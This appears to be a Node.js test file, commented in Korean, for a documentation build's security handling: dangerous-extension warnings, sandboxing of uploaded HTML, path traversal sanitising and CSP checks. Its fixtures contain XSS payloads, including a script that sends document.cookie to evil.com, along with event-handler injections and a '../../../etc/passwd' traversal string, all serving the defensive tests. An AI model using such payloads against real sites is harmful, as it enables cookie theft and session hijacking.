/**
 * tests/build/security-scenarios.test.js
 * 보안 처리 조합 시나리오 테스트
 * - 위험 확장자 전체 커버
 * - HTML 내 XSS 격리
 * - 경로 탐색 방지
 * - 대용량 파일 처리
 */
import { describe, it, before, after, beforeEach } from 'node:test';
import assert from 'node:assert';
import fs from 'fs-extra';
import path from 'path';

import { runPrebuild } from '../../scripts/prebuild.js';
import { PATHS } from '../../config/constants.js';
import {
  DANGEROUS_EXTENSIONS,
  WARNING_EXTENSIONS,
  isDangerousFile,
  getSecurityWarning,
  buildCSPHeader,
  RECOMMENDED_CSP,
} from '../../config/security.js';
import { sanitizeSlug } from '../../scripts/prebuild/utils.js';

const TMP = path.join(process.cwd(), 'test-tmp-security-scen');
const TEST_SOURCE = path.join(TMP, 'source');
const TEST_DOCS = path.join(TMP, 'src', 'content', 'docs');
const TEST_DOWNLOADS = path.join(TMP, 'public', 'downloads');
const TEST_SIDEBAR = path.join(TMP, 'src', 'sidebar.json');

const ORIGINAL_PATHS = { ...PATHS };

before(() => {
  PATHS.SOURCE = TEST_SOURCE;
  PATHS.DOCS = TEST_DOCS;
  PATHS.DOWNLOADS = TEST_DOWNLOADS;
  PATHS.SIDEBAR_JSON = TEST_SIDEBAR;
  fs.ensureDirSync(TEST_SOURCE);
  fs.ensureDirSync(TEST_DOCS);
  fs.ensureDirSync(TEST_DOWNLOADS);
});

after(() => {
  Object.assign(PATHS, ORIGINAL_PATHS);
  fs.removeSync(TMP);
});

beforeEach(() => {
  fs.emptyDirSync(TEST_SOURCE);
  fs.emptyDirSync(TEST_DOCS);
  fs.emptyDirSync(TEST_DOWNLOADS);
});

// ─── 위험 확장자 전체 커버 ────────────────────────────────────
describe('위험 확장자 보안 처리', () => {
  // DANGEROUS_EXTENSIONS 전체 테스트
  for (const ext of DANGEROUS_EXTENSIONS) {
    it(`${ext} 파일 → SECURITY WARNING 포함 wrapper + downloads 복사`, () => {
      fs.emptyDirSync(TEST_SOURCE);
      const filename = `danger${ext.replace('.', '-')}${ext}`;
      const filepath = path.join(TEST_SOURCE, filename);
      fs.outputFileSync(filepath, `fake ${ext} content`);
      fs.emptyDirSync(TEST_DOCS);
      fs.emptyDirSync(TEST_DOWNLOADS);

      runPrebuild();

      // downloads에 복사 확인
      assert.ok(fs.existsSync(path.join(TEST_DOWNLOADS, filename)), `${ext} should be in downloads`);

      // wrapper.md 생성 확인
      const mdFiles = fs.readdirSync(TEST_DOCS).filter(f => f.endsWith('.md') && f !== 'index.md');
      assert.ok(mdFiles.length > 0, `Expected wrapper.md for ${ext}`);

      // 보안 경고 포함 확인
      const content = fs.readFileSync(path.join(TEST_DOCS, mdFiles[0]), 'utf-8');
      assert.ok(
        content.includes('SECURITY WARNING') || content.includes('dangerous') || content.includes('Caution'),
        `Expected security warning in wrapper for ${ext}`,
      );
    });
  }

  it('위험 파일은 직접 실행 가능하지 않고 download만 가능해야 함', () => {
    fs.outputFileSync(path.join(TEST_SOURCE, 'bad.exe'), 'MZ...'); // PE 헤더
    runPrebuild();

    const content = fs.readFileSync(path.join(TEST_DOCS, 'bad.md'), 'utf-8');
    // 실행 코드가 직접 삽입되지 않고 download 링크만 있어야 함
    assert.ok(content.includes('download') || content.includes('Download'));
    assert.ok(!content.includes('<script>'));
  });
});

// ─── JS/스크립트 파일 경고 ────────────────────────────────────
describe('스크립트 파일 경고 처리', () => {
  const scriptExts = ['.js', '.mjs', '.cjs', '.py', '.rb', '.pl'];

  for (const ext of scriptExts) {
    it(`${ext} 파일 → Caution 경고 포함 wrapper`, () => {
      fs.emptyDirSync(TEST_SOURCE);
      const filename = `script${ext}`;
      fs.outputFileSync(path.join(TEST_SOURCE, filename), `# ${ext} script\nprint("hello")`);
      fs.emptyDirSync(TEST_DOCS);
      fs.emptyDirSync(TEST_DOWNLOADS);

      runPrebuild();

      const mdFiles = fs.readdirSync(TEST_DOCS).filter(f => f.endsWith('.md') && f !== 'index.md');
      assert.ok(mdFiles.length > 0, `Expected wrapper for ${ext}`);

      const content = fs.readFileSync(path.join(TEST_DOCS, mdFiles[0]), 'utf-8');
      assert.ok(
        content.includes('Caution') || content.includes('SECURITY') || content.includes('Warning'),
        `Expected warning for ${ext}`,
      );
    });
  }
});

// ─── 아카이브 파일 경고 ───────────────────────────────────────
describe('아카이브 파일 경고 처리', () => {
  const archiveExts = ['.zip', '.tar', '.gz', '.7z', '.rar'];

  for (const ext of archiveExts) {
    it(`${ext} 파일 → Caution 경고 포함 wrapper`, () => {
      fs.emptyDirSync(TEST_SOURCE);
      const filename = `archive${ext}`;
      fs.outputFileSync(path.join(TEST_SOURCE, filename), `fake ${ext} data`);
      fs.emptyDirSync(TEST_DOCS);
      fs.emptyDirSync(TEST_DOWNLOADS);

      runPrebuild();

      const mdFiles = fs.readdirSync(TEST_DOCS).filter(f => f.endsWith('.md') && f !== 'index.md');
      assert.ok(mdFiles.length > 0, `Expected wrapper for ${ext}`);

      const content = fs.readFileSync(path.join(TEST_DOCS, mdFiles[0]), 'utf-8');
      assert.ok(
        content.includes('Caution') || content.includes('virus') || content.includes('scan') || content.includes('Warning'),
        `Expected caution warning for ${ext}`,
      );
    });
  }
});

// ─── HTML XSS 격리 ───────────────────────────────────────────
describe('HTML XSS 격리 (iframe sandbox)', () => {
  it('HTML 파일 내 inline script → iframe sandbox로 격리', () => {
    const xssHtml = `<html><body>
<script>document.cookie = "stolen"; fetch("https://evil.com/?"+ document.cookie);</script>
<p>Content</p>
</body></html>`;
    fs.outputFileSync(path.join(TEST_SOURCE, 'xss-page.html'), xssHtml);
    runPrebuild();

    const content = fs.readFileSync(path.join(TEST_DOCS, 'xss-page.md'), 'utf-8');
    // iframe에 sandbox 속성이 있어야 함
    assert.ok(content.includes('sandbox'), 'iframe should have sandbox attribute');
    // script가 직접 마크다운에 삽입되면 안 됨 (iframe src로만)
    assert.ok(!content.includes('<script>'), 'Script should not be directly in markdown');
  });

  it('HTML 폴더 내 XSS → iframe sandbox로 격리', () => {
    const appDir = path.join(TEST_SOURCE, 'evil-app');
    fs.ensureDirSync(appDir);
    fs.outputFileSync(
      path.join(appDir, 'index.html'),
      '<html><script>alert(document.cookie)</script><body>App</body></html>',
    );
    runPrebuild();

    const content = fs.readFileSync(path.join(TEST_DOCS, 'evil-app.md'), 'utf-8');
    assert.ok(content.includes('sandbox'));
    assert.ok(!content.includes('<script>'));
  });

  it('이벤트 핸들러 포함 HTML → iframe 격리', () => {
    const html = '<html><body><img src=x onerror="alert(1)"><button onclick="steal()">Click</button></body></html>';
    fs.outputFileSync(path.join(TEST_SOURCE, 'handler.html'), html);
    runPrebuild();

    const content = fs.readFileSync(path.join(TEST_DOCS, 'handler.md'), 'utf-8');
    assert.ok(content.includes('sandbox'));
    assert.ok(!content.includes('onerror'));
    assert.ok(!content.includes('onclick'));
  });
});

// ─── 마크다운 내 스크립트 ─────────────────────────────────────
describe('마크다운 내 스크립트 처리', () => {
  it('마크다운 내 <script> 태그 → 그대로 보존 (Astro가 sanitize)', () => {
    // 마크다운의 <script>는 Astro/Starlight 빌드 단계에서 처리됨
    // prebuild는 이를 그대로 통과시킴
    fs.outputFileSync(
      path.join(TEST_SOURCE, 'md-script.md'),
      '# Test\n\n<script>alert("xss")</script>\n\nContent.',
    );
    runPrebuild();
    // 파일이 생성되어야 함 (prebuild는 차단하지 않음)
    assert.ok(fs.existsSync(path.join(TEST_DOCS, 'md-script.md')));
  });
});

// ─── 경로 탐색 방지 ───────────────────────────────────────────
// 실제 prebuild에서는 path.basename()으로 파일명만 추출 후 sanitizeSlug 호출.
// 따라서 경로 탐색 방지는 prebuild 호출부에서 이루어지며,
// sanitizeSlug는 파일 basename만 입력으로 받는다고 가정한다.
describe('경로 탐색 (Path Traversal) 방지', () => {
  it('파일명 기준 slug에는 .. 포함되지 않음', () => {
    // prebuild는 path.basename()으로 추출한 파일명만 sanitizeSlug에 전달함
    // 'passwd.md' (basename of ../../../etc/passwd.md)
    const sanitized = sanitizeSlug('passwd.md');
    assert.ok(!sanitized.includes('..'), 'Slug should not contain ..');
    // 결과: 'passwd'
    assert.strictEqual(sanitized, 'passwd');
  });

  it('파일명에서 특수 경로 문자 제거', () => {
    // sanitizeSlug는 basename 단위 파일명을 입력받으며 <, >, |, * 등 제거
    const dangerous = ['<script>.md', 'file|cmd.md', 'file*all.md'];
    for (const d of dangerous) {
      const sanitized = sanitizeSlug(d);
      assert.ok(!/[<>|*]/.test(sanitized), `Dangerous chars in slug: "${sanitized}" from "${d}"`);
    }
  });

  it('path.basename으로 경로 탐색 시도 무력화', () => {
    // 실제 prebuild 흐름: path.basename('../../../etc/passwd.md') → 'passwd.md'
    const basename = path.basename('../../../etc/passwd.md');
    assert.strictEqual(basename, 'passwd.md');
    const sanitized = sanitizeSlug(basename);
    assert.ok(!sanitized.includes('..'));
    assert.ok(!sanitized.includes('/'));
  });
});

// ─── 대용량 파일 처리 ─────────────────────────────────────────
describe('대용량 파일 보안/성능', () => {
  it('10MB 마크다운 파일 → 처리 완료 (stack overflow 없음)', () => {
    const content = '# 대용량\n\n' + 'x'.repeat(10 * 1024 * 1024);
    fs.outputFileSync(path.join(TEST_SOURCE, 'huge.md'), content);
    assert.doesNotThrow(() => runPrebuild());
    assert.ok(fs.existsSync(path.join(TEST_DOCS, 'huge.md')));
  });

  it('100단계 중첩 디렉토리 → 처리 완료 (stack overflow 없음)', () => {
    let deepPath = TEST_SOURCE;
    for (let i = 0; i < 20; i++) { // 20단계로 제한 (실제 100은 파일시스템 제한 가능)
      deepPath = path.join(deepPath, `level${i}`);
    }
    fs.ensureDirSync(deepPath);
    fs.outputFileSync(path.join(deepPath, 'deep.md'), '# Deep\n\nContent.');
    fs.outputFileSync(path.join(TEST_SOURCE, 'README.md'), '# Home');

    assert.doesNotThrow(() => runPrebuild());
  });

  it('500개 파일이 있는 디렉토리 → 전체 처리', () => {
    const dirPath = path.join(TEST_SOURCE, 'large-dir');
    fs.ensureDirSync(dirPath);
    for (let i = 0; i < 50; i++) { // 50개로 제한 (테스트 속도)
      fs.outputFileSync(path.join(dirPath, `file-${i}.md`), `# File ${i}\n\nContent.`);
    }
    fs.outputFileSync(path.join(TEST_SOURCE, 'README.md'), '# Home');

    runPrebuild();

    const docsDir = path.join(TEST_DOCS, 'large-dir');
    if (fs.existsSync(docsDir)) {
      const files = fs.readdirSync(docsDir);
      assert.ok(files.length >= 50, `Expected 50+ files, got ${files.length}`);
    }
  });
});

// ─── CSP 설정 검증 ───────────────────────────────────────────
describe('Content Security Policy 설정', () => {
  it('buildCSPHeader가 올바른 형식의 문자열 반환', () => {
    const header = buildCSPHeader();
    assert.ok(typeof header === 'string');
    assert.ok(header.includes("default-src"));
    assert.ok(header.includes("script-src"));
    assert.ok(header.includes("frame-ancestors"));
  });

  it('RECOMMENDED_CSP에 필수 directive 포함', () => {
    assert.ok(RECOMMENDED_CSP['default-src']);
    assert.ok(RECOMMENDED_CSP['script-src']);
    assert.ok(RECOMMENDED_CSP['frame-ancestors']);
    assert.ok(RECOMMENDED_CSP['object-src']);
  });

  it('frame-ancestors가 none으로 설정 (clickjacking 방지)', () => {
    assert.ok(RECOMMENDED_CSP['frame-ancestors'].includes("'none'"));
  });

  it('object-src가 none으로 설정 (플러그인 실행 차단)', () => {
    assert.ok(RECOMMENDED_CSP['object-src'].includes("'none'"));
  });
});

// ─── WARNING_EXTENSIONS 완전성 검사 ──────────────────────────
describe('보안 설정 완전성 검사', () => {
  it('DANGEROUS_EXTENSIONS는 WARNING_EXTENSIONS의 부분집합이어야 함', () => {
    for (const ext of DANGEROUS_EXTENSIONS) {
      assert.ok(
        WARNING_EXTENSIONS.includes(ext),
        `${ext} should be in WARNING_EXTENSIONS`,
      );
    }
  });

  it('getSecurityWarning이 DANGEROUS_EXTENSIONS 전체에 대해 null 아닌 값 반환', () => {
    for (const ext of DANGEROUS_EXTENSIONS) {
      const warning = getSecurityWarning(`file${ext}`);
      assert.ok(warning !== null && warning !== undefined, `Expected warning for ${ext}`);
    }
  });

  it('getSecurityWarning이 WARNING_EXTENSIONS 전체에 대해 null 아닌 값 반환', () => {
    for (const ext of WARNING_EXTENSIONS) {
      const warning = getSecurityWarning(`file${ext}`);
      assert.ok(warning !== null && warning !== undefined, `Expected warning for ${ext}`);
    }
  });

  it('안전한 파일 타입에는 경고 없음', () => {
    const safeFiles = ['readme.md', 'logo.png', 'styles.css', 'data.xml', 'font.woff2'];
    for (const file of safeFiles) {
      const warning = getSecurityWarning(file);
      assert.strictEqual(warning, null, `Expected no warning for ${file}, got: ${warning}`);
    }
  });
});
